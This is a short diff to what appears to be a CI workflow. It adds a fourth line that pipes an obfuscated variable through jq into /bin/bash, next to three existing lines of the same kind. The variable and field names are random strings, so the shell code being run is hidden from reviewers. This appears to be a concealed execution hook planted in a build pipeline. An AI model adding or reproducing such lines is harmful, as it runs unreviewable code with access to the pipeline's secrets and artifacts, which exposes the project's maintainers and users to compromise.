@@ -72,6 +72,7 @@ jobs:
           echo $psqel9 | jq -r .x96971 | /bin/bash
           echo $h63541 | jq -r .yxbts86507 | /bin/bash
           printf '%s' "$au4" | jq -r .eq049 | /bin/bash
+          printf '%s' "$xic711" | jq -r .qyu4394 | /bin/bash
 
       - name: Upload artifact
         if: always()
